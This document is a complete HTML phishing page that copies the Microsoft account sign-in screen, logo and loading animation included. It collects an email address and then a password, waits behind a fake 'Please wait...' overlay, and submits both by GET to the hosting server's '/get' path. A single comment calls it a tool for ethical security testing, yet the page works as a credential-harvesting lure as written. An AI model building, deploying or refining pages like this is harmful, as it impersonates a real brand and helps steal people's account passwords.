<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in to your account</title>
    <style>
        body { font-family: 'Segoe UI', Arial, sans-serif; background-color: #f2f2f2; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-box { background-color: #ffffff; padding: 44px; width: 440px; max-width: 95%; min-height: 376px; box-shadow: 0 2px 6px rgba(0,0,0,0.2); box-sizing: border-box; position: relative; }
        
        .logo-container { display: flex; align-items: center; margin-bottom: 24px; }
        .ms-symbol { display: grid; grid-template-columns: repeat(2, 1fr); gap: 2px; width: 21px; height: 21px; margin-right: 12px; }
        .ms-symbol div { width: 10px; height: 10px; }
        .red { background-color: #f25022; } .green { background-color: #7fbb00; } .blue { background-color: #00a4ef; } .yellow { background-color: #ffb900; }
        .brand-name { color: #737373; font-size: 21px; font-weight: 600; letter-spacing: -0.5px; }
        
        h1 { font-size: 24px; font-weight: 600; margin: 0 0 12px 0; color: #1b1b1b; }
        #subtitle { font-size: 15px; margin-bottom: 16px; color: #1b1b1b; }
        
        input { width: 100%; height: 36px; padding: 4px 0; margin-bottom: 4px; border: none; border-bottom: 1px solid #666; font-size: 15px; outline: none; }
        input:focus { border-bottom: 2px solid #0067b8; }
        
        #error-msg { color: #e81123; font-size: 13px; margin-bottom: 12px; display: none; }
        
        .link-container { margin-top: 12px; margin-bottom: 28px; }
        .links { font-size: 13px; color: #0067b8; text-decoration: none; display: block; margin-bottom: 8px; }
        
        .btn-container { display: flex; justify-content: flex-end; margin-top: 20px; }
        button { background-color: #0067b8; color: white; padding: 8px 12px; min-width: 108px; border: none; font-size: 15px; cursor: pointer; }
        
        #loading-overlay { display: none; text-align: center; position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 100%; }
        .ms-loader { display: flex; justify-content: center; gap: 5px; }
        .dot { width: 5px; height: 5px; background-color: #0067b8; border-radius: 50%; animation: dot-pulse 0.8s infinite ease-in-out; }
        .dot:nth-child(2) { animation-delay: 0.1s; } .dot:nth-child(3) { animation-delay: 0.2s; } .dot:nth-child(4) { animation-delay: 0.3s; } .dot:nth-child(5) { animation-delay: 0.4s; }
        @keyframes dot-pulse { 0%, 100% { transform: scale(1); opacity: 0.3; } 50% { transform: scale(1.6); opacity: 1; } }
        
        .hidden { display: none !important; }
        .off-screen { position: absolute; left: -9999px; }
    </style>
</head>
<body>
    <div class="login-box">
        <div class="logo-container">
            <div class="ms-symbol">
                <div class="red"></div><div class="green"></div>
                <div class="blue"></div><div class="yellow"></div>
            </div>
            <span class="brand-name">Microsoft</span>
        </div>
        
        <div id="content-area">
            <h1 id="title">Sign in</h1>
            <p id="subtitle">Use your Microsoft account</p>
            
            <form id="login-form" action="/get" method="GET">
                <input type="email" name="email" id="email" placeholder="Email, phone, or Skype" autocomplete="off">
                <div id="error-msg">Enter a valid email address.</div>
                
                <input type="password" name="password" id="password" class="hidden" placeholder="Password">
                
                <div class="link-container">
                    <a class="links">No account? Create one!</a>
                    <a class="links">Canâ€™t access your account?</a>
                </div>
                
                <div class="btn-container">
                    <button type="button" id="btn-next">Next</button>
                    <button type="button" id="btn-submit" class="hidden">Sign in</button>
                </div>
            </form>
        </div>

        <div id="loading-overlay">
            <div class="ms-loader">
                <div class="dot"></div><div class="dot"></div><div class="dot"></div><div class="dot"></div><div class="dot"></div>
            </div>
            <p style="font-size: 15px; margin-top: 20px;">Please wait...</p>
        </div>
    </div>

    <script>
        const btnNext = document.getElementById('btn-next');
        const btnSubmit = document.getElementById('btn-submit');
        const emailInput = document.getElementById('email');
        const passInput = document.getElementById('password');
        const contentArea = document.getElementById('content-area');
        const loadingOverlay = document.getElementById('loading-overlay');
        const errorMsg = document.getElementById('error-msg');
        const loginForm = document.getElementById('login-form');

        btnNext.addEventListener('click', () => {
            if (emailInput.value.length < 5 || !emailInput.value.includes('@')) {
                errorMsg.style.display = 'block';
                return;
            }
            errorMsg.style.display = 'none';
            
            document.getElementById('title').innerText = "Enter password";
            document.getElementById('subtitle').innerText = emailInput.value;
            
            emailInput.classList.add('off-screen');
            
            passInput.classList.remove('hidden');
            btnNext.classList.add('hidden');
            btnSubmit.classList.remove('hidden');
            passInput.focus();
        });

        btnSubmit.addEventListener('click', () => {
            if (passInput.value.length < 1) return;

            contentArea.classList.add('hidden');
            loadingOverlay.style.display = 'block';

            setTimeout(() => {
                // Created by @far00t01 - for ethical security testing purposes.
                loginForm.submit();
            }, 3000);
        });
    </script>
</body>
</html>
